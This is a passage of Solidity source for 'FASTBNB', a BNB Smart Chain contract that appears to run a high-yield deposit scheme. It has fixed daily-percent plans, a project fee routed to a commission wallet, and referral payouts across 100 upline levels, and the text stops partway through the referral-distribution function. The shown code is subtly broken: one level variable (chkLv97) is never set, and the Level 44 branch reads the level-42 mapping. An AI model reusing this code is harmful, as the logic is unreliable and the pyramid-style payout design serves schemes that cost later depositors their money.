/**
 *Submitted for verification at BscScan.com on 2021-11-29
*/

pragma solidity 0.5.10;

contract FASTBNB {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 1e17; // 0.1 bnb 
	uint256[] public REFERRAL_PERCENTS 	= [400, 300, 250, 200, 175, 150, 125, 100, 75, 25];
	uint256[] public SEED_PERCENTS 		= [1000, 900, 800, 700, 600, 500, 400, 300, 200, 100, 75, 75, 75, 75, 50, 50, 50, 50, 50, 50, 20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20];
	uint256 constant public PROJECT_FEE = 1000;
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalInvested;
	uint256 public totalRefBonus;
	
	
	address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;
	
	address chkLv11;
	address chkLv12;
    address chkLv13;
    address chkLv14;
    address chkLv15;
    address chkLv16;
    address chkLv17;
    address chkLv18;
    address chkLv19;
    address chkLv20;
	
	address chkLv21;
	address chkLv22;
    address chkLv23;
    address chkLv24;
    address chkLv25;
    address chkLv26;
    address chkLv27;
    address chkLv28;
    address chkLv29;
    address chkLv30;
	
	address chkLv31;
	address chkLv32;
    address chkLv33;
    address chkLv34;
    address chkLv35;
    address chkLv36;
    address chkLv37;
    address chkLv38;
    address chkLv39;
    address chkLv40;
	
	address chkLv41;
	address chkLv42;
    address chkLv43;
    address chkLv44;
    address chkLv45;
    address chkLv46;
    address chkLv47;
    address chkLv48;
    address chkLv49;
    address chkLv50;
	
	address chkLv51;
	address chkLv52;
    address chkLv53;
    address chkLv54;
    address chkLv55;
    address chkLv56;
    address chkLv57;
    address chkLv58;
    address chkLv59;
    address chkLv60;
	
	address chkLv61;
	address chkLv62;
    address chkLv63;
    address chkLv64;
    address chkLv65;
    address chkLv66;
    address chkLv67;
    address chkLv68;
    address chkLv69;
    address chkLv70;
	
	address chkLv71;
	address chkLv72;
    address chkLv73;
    address chkLv74;
    address chkLv75;
    address chkLv76;
    address chkLv77;
    address chkLv78;
    address chkLv79;
    address chkLv80;
	
	address chkLv81;
	address chkLv82;
    address chkLv83;
    address chkLv84;
    address chkLv85;
    address chkLv86;
    address chkLv87;
    address chkLv88;
    address chkLv89;
    address chkLv90;
	
	address chkLv91;
	address chkLv92;
    address chkLv93;
    address chkLv94;
    address chkLv95;
    address chkLv96;
    address chkLv97;
    address chkLv98;
    address chkLv99;
    address chkLv100;
	
	
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
	
	mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;
	
	mapping(address => address) internal referralLevel11Address;
    mapping(address => address) internal referralLevel12Address;
    mapping(address => address) internal referralLevel13Address;
    mapping(address => address) internal referralLevel14Address;
    mapping(address => address) internal referralLevel15Address;
    mapping(address => address) internal referralLevel16Address;
    mapping(address => address) internal referralLevel17Address;
    mapping(address => address) internal referralLevel18Address;
    mapping(address => address) internal referralLevel19Address;
    mapping(address => address) internal referralLevel20Address;
	
	mapping(address => address) internal referralLevel21Address;
    mapping(address => address) internal referralLevel22Address;
    mapping(address => address) internal referralLevel23Address;
    mapping(address => address) internal referralLevel24Address;
    mapping(address => address) internal referralLevel25Address;
    mapping(address => address) internal referralLevel26Address;
    mapping(address => address) internal referralLevel27Address;
    mapping(address => address) internal referralLevel28Address;
    mapping(address => address) internal referralLevel29Address;
    mapping(address => address) internal referralLevel30Address;
	
	mapping(address => address) internal referralLevel31Address;
    mapping(address => address) internal referralLevel32Address;
    mapping(address => address) internal referralLevel33Address;
    mapping(address => address) internal referralLevel34Address;
    mapping(address => address) internal referralLevel35Address;
    mapping(address => address) internal referralLevel36Address;
    mapping(address => address) internal referralLevel37Address;
    mapping(address => address) internal referralLevel38Address;
    mapping(address => address) internal referralLevel39Address;
    mapping(address => address) internal referralLevel40Address;
	
	mapping(address => address) internal referralLevel41Address;
    mapping(address => address) internal referralLevel42Address;
    mapping(address => address) internal referralLevel43Address;
    mapping(address => address) internal referralLevel44Address;
    mapping(address => address) internal referralLevel45Address;
    mapping(address => address) internal referralLevel46Address;
    mapping(address => address) internal referralLevel47Address;
    mapping(address => address) internal referralLevel48Address;
    mapping(address => address) internal referralLevel49Address;
    mapping(address => address) internal referralLevel50Address;
    
	mapping(address => address) internal referralLevel51Address;
    mapping(address => address) internal referralLevel52Address;
    mapping(address => address) internal referralLevel53Address;
    mapping(address => address) internal referralLevel54Address;
    mapping(address => address) internal referralLevel55Address;
    mapping(address => address) internal referralLevel56Address;
    mapping(address => address) internal referralLevel57Address;
    mapping(address => address) internal referralLevel58Address;
    mapping(address => address) internal referralLevel59Address;
    mapping(address => address) internal referralLevel60Address;
	
	mapping(address => address) internal referralLevel61Address;
    mapping(address => address) internal referralLevel62Address;
    mapping(address => address) internal referralLevel63Address;
    mapping(address => address) internal referralLevel64Address;
    mapping(address => address) internal referralLevel65Address;
    mapping(address => address) internal referralLevel66Address;
    mapping(address => address) internal referralLevel67Address;
    mapping(address => address) internal referralLevel68Address;
    mapping(address => address) internal referralLevel69Address;
    mapping(address => address) internal referralLevel70Address;
	
	mapping(address => address) internal referralLevel71Address;
    mapping(address => address) internal referralLevel72Address;
    mapping(address => address) internal referralLevel73Address;
    mapping(address => address) internal referralLevel74Address;
    mapping(address => address) internal referralLevel75Address;
    mapping(address => address) internal referralLevel76Address;
    mapping(address => address) internal referralLevel77Address;
    mapping(address => address) internal referralLevel78Address;
    mapping(address => address) internal referralLevel79Address;
    mapping(address => address) internal referralLevel80Address;
	
	mapping(address => address) internal referralLevel81Address;
    mapping(address => address) internal referralLevel82Address;
    mapping(address => address) internal referralLevel83Address;
    mapping(address => address) internal referralLevel84Address;
    mapping(address => address) internal referralLevel85Address;
    mapping(address => address) internal referralLevel86Address;
    mapping(address => address) internal referralLevel87Address;
    mapping(address => address) internal referralLevel88Address;
    mapping(address => address) internal referralLevel89Address;
    mapping(address => address) internal referralLevel90Address;
	
	mapping(address => address) internal referralLevel91Address;
    mapping(address => address) internal referralLevel92Address;
    mapping(address => address) internal referralLevel93Address;
    mapping(address => address) internal referralLevel94Address;
    mapping(address => address) internal referralLevel95Address;
    mapping(address => address) internal referralLevel96Address;
    mapping(address => address) internal referralLevel97Address;
    mapping(address => address) internal referralLevel98Address;
    mapping(address => address) internal referralLevel99Address;
    mapping(address => address) internal referralLevel100Address;
    
	

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[10] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 seedincome;
		uint256 withdrawn;
		uint256 withdrawnseed;
	}
	
	
	

	mapping (address => User) internal users;

	bool public started;
	address payable public commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event SeedIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet) public {
		require(!isContract(wallet));
		commissionWallet = wallet;

        plans.push(Plan(10000, 15));
		plans.push(Plan(120, 20));
		plans.push(Plan(90, 25));
		plans.push(Plan(60, 30));
       
	}
	
	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

    
	
	
	 function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
       
          address _customerAddress        = _sender;
        // Level 1
        referralLevel1Address[_customerAddress]                     = _referredBy;
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];
		
		chkLv11                          = referralLevel10Address[_referredBy];
	    chkLv12                          = referralLevel11Address[_referredBy];
        chkLv13                          = referralLevel12Address[_referredBy];
        chkLv14                          = referralLevel13Address[_referredBy];
        chkLv15                          = referralLevel14Address[_referredBy];
        chkLv16                          = referralLevel15Address[_referredBy];
        chkLv17                          = referralLevel16Address[_referredBy];
        chkLv18                          = referralLevel17Address[_referredBy];
        chkLv19                          = referralLevel18Address[_referredBy];
        chkLv20                          = referralLevel19Address[_referredBy];
		
	    chkLv21                          = referralLevel20Address[_referredBy];
	    chkLv22                          = referralLevel21Address[_referredBy];
        chkLv23                          = referralLevel22Address[_referredBy];
        chkLv24                          = referralLevel23Address[_referredBy];
        chkLv25                          = referralLevel24Address[_referredBy];
        chkLv26                          = referralLevel25Address[_referredBy];
        chkLv27                          = referralLevel26Address[_referredBy];
        chkLv28                          = referralLevel27Address[_referredBy];
        chkLv29                          = referralLevel28Address[_referredBy];
        chkLv30                          = referralLevel29Address[_referredBy];
		
		chkLv31                          = referralLevel30Address[_referredBy];
	    chkLv32                          = referralLevel31Address[_referredBy];
        chkLv33                          = referralLevel32Address[_referredBy];
        chkLv34                          = referralLevel33Address[_referredBy];
        chkLv35                          = referralLevel34Address[_referredBy];
        chkLv36                          = referralLevel35Address[_referredBy];
        chkLv37                          = referralLevel36Address[_referredBy];
        chkLv38                          = referralLevel37Address[_referredBy];
        chkLv39                          = referralLevel38Address[_referredBy];
        chkLv40                          = referralLevel39Address[_referredBy];
		
		chkLv41                          = referralLevel40Address[_referredBy];
	    chkLv42                          = referralLevel41Address[_referredBy];
        chkLv43                          = referralLevel42Address[_referredBy];
        chkLv44                          = referralLevel43Address[_referredBy];
        chkLv45                          = referralLevel44Address[_referredBy];
        chkLv46                          = referralLevel45Address[_referredBy];
        chkLv47                          = referralLevel46Address[_referredBy];
        chkLv48                          = referralLevel47Address[_referredBy];
        chkLv49                          = referralLevel48Address[_referredBy];
        chkLv50                          = referralLevel49Address[_referredBy];
		
		chkLv51                          = referralLevel50Address[_referredBy];
	    chkLv52                          = referralLevel51Address[_referredBy];
        chkLv53                          = referralLevel52Address[_referredBy];
        chkLv54                          = referralLevel53Address[_referredBy];
        chkLv55                          = referralLevel54Address[_referredBy];
        chkLv56                          = referralLevel55Address[_referredBy];
        chkLv57                          = referralLevel56Address[_referredBy];
        chkLv58                          = referralLevel57Address[_referredBy];
        chkLv59                          = referralLevel58Address[_referredBy];
        chkLv60                          = referralLevel59Address[_referredBy];
		
		chkLv61                          = referralLevel60Address[_referredBy];
	    chkLv62                          = referralLevel61Address[_referredBy];
        chkLv63                          = referralLevel62Address[_referredBy];
        chkLv64                          = referralLevel63Address[_referredBy];
        chkLv65                          = referralLevel64Address[_referredBy];
        chkLv66                          = referralLevel65Address[_referredBy];
        chkLv67                          = referralLevel66Address[_referredBy];
        chkLv68                          = referralLevel67Address[_referredBy];
        chkLv69                          = referralLevel68Address[_referredBy];
        chkLv70                          = referralLevel69Address[_referredBy];
		
		chkLv71                          = referralLevel70Address[_referredBy];
	    chkLv72                          = referralLevel71Address[_referredBy];
        chkLv73                          = referralLevel72Address[_referredBy];
        chkLv74                          = referralLevel73Address[_referredBy];
        chkLv75                          = referralLevel74Address[_referredBy];
        chkLv76                          = referralLevel75Address[_referredBy];
        chkLv77                          = referralLevel76Address[_referredBy];
        chkLv78                          = referralLevel77Address[_referredBy];
        chkLv79                          = referralLevel78Address[_referredBy];
        chkLv80                          = referralLevel79Address[_referredBy];
		
        chkLv81                          = referralLevel80Address[_referredBy];
	    chkLv82                          = referralLevel81Address[_referredBy];
        chkLv83                          = referralLevel82Address[_referredBy];
        chkLv84                          = referralLevel83Address[_referredBy];
        chkLv85                          = referralLevel84Address[_referredBy];
        chkLv86                          = referralLevel85Address[_referredBy];
        chkLv87                          = referralLevel86Address[_referredBy];
        chkLv88                          = referralLevel87Address[_referredBy];
        chkLv89                          = referralLevel88Address[_referredBy];
        chkLv90                          = referralLevel89Address[_referredBy];
		
		chkLv91                          = referralLevel90Address[_referredBy];
	    chkLv92                          = referralLevel91Address[_referredBy];
        chkLv93                          = referralLevel92Address[_referredBy];
        chkLv94                          = referralLevel93Address[_referredBy];
        chkLv95                          = referralLevel94Address[_referredBy];
        chkLv96                          = referralLevel95Address[_referredBy];
        chkLv98                          = referralLevel97Address[_referredBy];
        chkLv99                          = referralLevel98Address[_referredBy];
        chkLv100                         = referralLevel99Address[_referredBy];
		
		
		
		
		
		
        // Level 2
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
        // Level 3
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
        // Level 4
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
        // Level 5
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
        // Level 6
        if(chkLv6 != 0x0000000000000000000000000000000000000000) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
            }
        }
        
        // Level 7
        if(chkLv7 != 0x0000000000000000000000000000000000000000) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
           if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
            }
        }
        
        // Level 8
        if(chkLv8 != 0x0000000000000000000000000000000000000000) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
            }
        }
        
        // Level 9
        if(chkLv9 != 0x0000000000000000000000000000000000000000) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
            }
        }
        
        // Level 10
        if(chkLv10 != 0x0000000000000000000000000000000000000000) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
            }
        }
		
		// Level 11
        if(chkLv11 != 0x0000000000000000000000000000000000000000) {
            referralLevel11Address[_customerAddress]                    = referralLevel10Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel10Address[_referredBy], _customerAddress, 11);
            }
        }
		
		 // Level 12
        if(chkLv12 != 0x0000000000000000000000000000000000000000) {
            referralLevel12Address[_customerAddress]                    = referralLevel11Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel11Address[_referredBy], _customerAddress, 12);
            }
        }
		
		 // Level 13
        if(chkLv13 != 0x0000000000000000000000000000000000000000) {
            referralLevel13Address[_customerAddress]                    = referralLevel12Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel12Address[_referredBy], _customerAddress, 13);
            }
        }
		
		 // Level 14
        if(chkLv14 != 0x0000000000000000000000000000000000000000) {
            referralLevel14Address[_customerAddress]                    = referralLevel13Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel13Address[_referredBy], _customerAddress, 14);
            }
        }
		
		 // Level 15
        if(chkLv15 != 0x0000000000000000000000000000000000000000) {
            referralLevel15Address[_customerAddress]                    = referralLevel14Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel14Address[_referredBy], _customerAddress, 15);
            }
        }
		
		 // Level 16
        if(chkLv16 != 0x0000000000000000000000000000000000000000) {
            referralLevel16Address[_customerAddress]                    = referralLevel15Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel15Address[_referredBy], _customerAddress, 16);
            }
        }
		
		// Level 17
        if(chkLv17 != 0x0000000000000000000000000000000000000000) {
            referralLevel17Address[_customerAddress]                    = referralLevel16Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel16Address[_referredBy], _customerAddress, 17);
            }
        }
		
		// Level 18
        if(chkLv18 != 0x0000000000000000000000000000000000000000) {
            referralLevel18Address[_customerAddress]                    = referralLevel17Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel17Address[_referredBy], _customerAddress, 18);
            }
        }
		
		// Level 19
        if(chkLv19 != 0x0000000000000000000000000000000000000000) {
            referralLevel19Address[_customerAddress]                    = referralLevel18Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel18Address[_referredBy], _customerAddress, 19);
            }
        }
		
		// Level 20
        if(chkLv20 != 0x0000000000000000000000000000000000000000) {
            referralLevel20Address[_customerAddress]                    = referralLevel19Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel19Address[_referredBy], _customerAddress, 20);
            }
        }
		
		// Level 21
		if(chkLv21 != 0x0000000000000000000000000000000000000000) {
			referralLevel21Address[_customerAddress]                    = referralLevel20Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel20Address[_referredBy], _customerAddress, 21);
			}
		}

		// Level 22
		if(chkLv22 != 0x0000000000000000000000000000000000000000) {
			referralLevel22Address[_customerAddress]                    = referralLevel21Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel21Address[_referredBy], _customerAddress, 22);
			}
		}

		// Level 23
		if(chkLv23 != 0x0000000000000000000000000000000000000000) {
			referralLevel23Address[_customerAddress]                    = referralLevel22Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel22Address[_referredBy], _customerAddress, 23);
			}
		}

		// Level 24
		if(chkLv24 != 0x0000000000000000000000000000000000000000) {
			referralLevel24Address[_customerAddress]                    = referralLevel23Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel23Address[_referredBy], _customerAddress, 24);
			}
		}

		// Level 25
		if(chkLv25 != 0x0000000000000000000000000000000000000000) {
			referralLevel25Address[_customerAddress]                    = referralLevel24Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel24Address[_referredBy], _customerAddress, 25);
			}
		}

		// Level 26
		if(chkLv26 != 0x0000000000000000000000000000000000000000) {
			referralLevel26Address[_customerAddress]                    = referralLevel25Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel25Address[_referredBy], _customerAddress, 26);
			}
		}

		// Level 27
		if(chkLv27 != 0x0000000000000000000000000000000000000000) {
			referralLevel27Address[_customerAddress]                    = referralLevel26Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel26Address[_referredBy], _customerAddress, 27);
			}
		}

		// Level 28
		if(chkLv28 != 0x0000000000000000000000000000000000000000) {
			referralLevel28Address[_customerAddress]                    = referralLevel27Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel27Address[_referredBy], _customerAddress, 28);
			}
		}

		// Level 29
		if(chkLv29 != 0x0000000000000000000000000000000000000000) {
			referralLevel29Address[_customerAddress]                    = referralLevel28Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel28Address[_referredBy], _customerAddress, 29);
			}
		}

		// Level 30
		if(chkLv30 != 0x0000000000000000000000000000000000000000) {
			referralLevel30Address[_customerAddress]                    = referralLevel29Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel29Address[_referredBy], _customerAddress, 30);
			}
		}
		
		// Level 31
		if(chkLv31 != 0x0000000000000000000000000000000000000000) {
			referralLevel31Address[_customerAddress]                    = referralLevel30Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel30Address[_referredBy], _customerAddress, 31);
			}
		}

		// Level 32
		if(chkLv32 != 0x0000000000000000000000000000000000000000) {
			referralLevel32Address[_customerAddress]                    = referralLevel31Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel31Address[_referredBy], _customerAddress, 32);
			}
		}

		// Level 33
		if(chkLv33 != 0x0000000000000000000000000000000000000000) {
			referralLevel33Address[_customerAddress]                    = referralLevel32Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel32Address[_referredBy], _customerAddress, 33);
			}
		}

		// Level 34
		if(chkLv34 != 0x0000000000000000000000000000000000000000) {
			referralLevel34Address[_customerAddress]                    = referralLevel33Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel33Address[_referredBy], _customerAddress, 34);
			}
		}

		// Level 35
		if(chkLv35 != 0x0000000000000000000000000000000000000000) {
			referralLevel35Address[_customerAddress]                    = referralLevel34Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel34Address[_referredBy], _customerAddress, 35);
			}
		}

		// Level 36
		if(chkLv36 != 0x0000000000000000000000000000000000000000) {
			referralLevel36Address[_customerAddress]                    = referralLevel35Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel35Address[_referredBy], _customerAddress, 36);
			}
		}

		// Level 37
		if(chkLv37 != 0x0000000000000000000000000000000000000000) {
			referralLevel37Address[_customerAddress]                    = referralLevel36Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel36Address[_referredBy], _customerAddress, 37);
			}
		}

		// Level 38
		if(chkLv38 != 0x0000000000000000000000000000000000000000) {
			referralLevel38Address[_customerAddress]                    = referralLevel37Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel37Address[_referredBy], _customerAddress, 38);
			}
		}

		// Level 39
		if(chkLv39 != 0x0000000000000000000000000000000000000000) {
			referralLevel39Address[_customerAddress]                    = referralLevel38Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel38Address[_referredBy], _customerAddress, 39);
			}
		}

		// Level 40
		if(chkLv40 != 0x0000000000000000000000000000000000000000) {
			referralLevel40Address[_customerAddress]                    = referralLevel39Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel39Address[_referredBy], _customerAddress, 40);
			}
		}
		// Level 41
		if(chkLv41 != 0x0000000000000000000000000000000000000000) {
			referralLevel41Address[_customerAddress]                    = referralLevel40Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel40Address[_referredBy], _customerAddress, 41);
			}
		}

		// Level 42
		if(chkLv42 != 0x0000000000000000000000000000000000000000) {
			referralLevel42Address[_customerAddress]                    = referralLevel41Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel41Address[_referredBy], _customerAddress, 42);
			}
		}
		
			// Level 43
		if(chkLv43 != 0x0000000000000000000000000000000000000000) {
			referralLevel43Address[_customerAddress]                    = referralLevel42Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel42Address[_referredBy], _customerAddress, 43);
			}
		}

		// Level 44
		if(chkLv44 != 0x0000000000000000000000000000000000000000) {
			referralLevel44Address[_customerAddress]                    = referralLevel42Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel42Address[_referredBy], _customerAddress, 44);
			}
		}



		// Level 45
		if(chkLv45 != 0x0000000000000000000000000000000000000000) {
			referralLevel45Address[_customerAddress]                    = referralLevel44Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel44Address[_referredBy], _customerAddress, 45);
			}
		}

		// Level 46
		if(chkLv46 != 0x0000000000000000000000000000000000000000) {
			referralLevel46Address[_customerAddress]                    = referralLevel45Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel45Address[_referredBy], _customerAddress, 46);
			}
		}

		// Level 47
		if(chkLv47 != 0x0000000000000000000000000000000000000000) {
			referralLevel47Address[_customerAddress]                    = referralLevel46Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel46Address[_referredBy], _customerAddress, 47);
			}
		}

		// Level 48
		if(chkLv48 != 0x0000000000000000000000000000000000000000) {
			referralLevel48Address[_customerAddress]                    = referralLevel47Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel47Address[_referredBy], _customerAddress, 48);
			}
		}

		// Level 49
		if(chkLv49 != 0x0000000000000000000000000000000000000000) {
			referralLevel49Address[_customerAddress]                    = referralLevel48Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel48Address[_referredBy], _customerAddress, 49);
			}
		}

		// Level 50
		if(chkLv50 != 0x0000000000000000000000000000000000000000) {
			referralLevel50Address[_customerAddress]                    = referralLevel49Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel49Address[_referredBy], _customerAddress, 50);
			}
		}
		

			
			
		// Level 51
		if(chkLv51 != 0x0000000000000000000000000000000000000000) {
			referralLevel51Address[_customerAddress]                    = referralLevel50Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel50Address[_referredBy], _customerAddress, 51);
			}
		}
			
		
		// Level 52
		if(chkLv52 != 0x0000000000000000000000000000000000000000) {
			referralLevel52Address[_customerAddress]                    = referralLevel51Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel51Address[_referredBy], _customerAddress, 52);
			}
		}
		
		// Level 53
		if(chkLv53 != 0x0000000000000000000000000000000000000000) {
			referralLevel53Address[_customerAddress]                    = referralLevel52Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel52Address[_referredBy], _customerAddress, 53);
			}
		}
		
		// Level 54
		if(chkLv54 != 0x0000000000000000000000000000000000000000) {
			referralLevel54Address[_customerAddress]                    = referralLevel53Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel53Address[_referredBy], _customerAddress, 54);
			}
		}
		
		
		// Level 55
		if(chkLv55 != 0x0000000000000000000000000000000000000000) {
			referralLevel55Address[_customerAddress]                    = referralLevel54Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel54Address[_referredBy], _customerAddress, 55);
			}
		}
		
		// Level 56
		if(chkLv56 != 0x0000000000000000000000000000000000000000) {
			referralLevel56Address[_customerAddress]                    = referralLevel55Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel55Address[_referredBy], _customerAddress, 56);
			}
		}
		
		
		// Level 57
		if(chkLv57 != 0x0000000000000000000000000000000000000000) {
			referralLevel57Address[_customerAddress]                    = referralLevel56Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel56Address[_referredBy], _customerAddress, 57);
			}
		}
		
		// Level 58
		if(chkLv58 != 0x0000000000000000000000000000000000000000) {
			referralLevel58Address[_customerAddress]                    = referralLevel57Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel57Address[_referredBy], _customerAddress, 58);
			}
		}
		
		
		// Level 59
		if(chkLv59 != 0x0000000000000000000000000000000000000000) {
			referralLevel59Address[_customerAddress]                    = referralLevel58Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel58Address[_referredBy], _customerAddress, 59);
			}
		}
		
		
		// Level 60
		if(chkLv60 != 0x0000000000000000000000000000000000000000) {
			referralLevel60Address[_customerAddress]                    = referralLevel59Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel59Address[_referredBy], _customerAddress, 60);
			}
		}
		
		// Level 61
		if(chkLv61 != 0x0000000000000000000000000000000000000000) {
			referralLevel61Address[_customerAddress]                    = referralLevel60Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel60Address[_referredBy], _customerAddress, 61);
			}
		}
		
		// Level 62
		if(chkLv62 != 0x0000000000000000000000000000000000000000) {
			referralLevel62Address[_customerAddress]                    = referralLevel61Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel61Address[_referredBy], _customerAddress, 62);
			}
		}
			
			
		// Level 63
		if(chkLv63 != 0x0000000000000000000000000000000000000000) {
			referralLevel63Address[_customerAddress]                    = referralLevel62Address[_referredBy];
			if(_newReferral == true) {
				addDownlineRef(referralLevel62Address[_referredBy], _customerAddress, 63);
			}
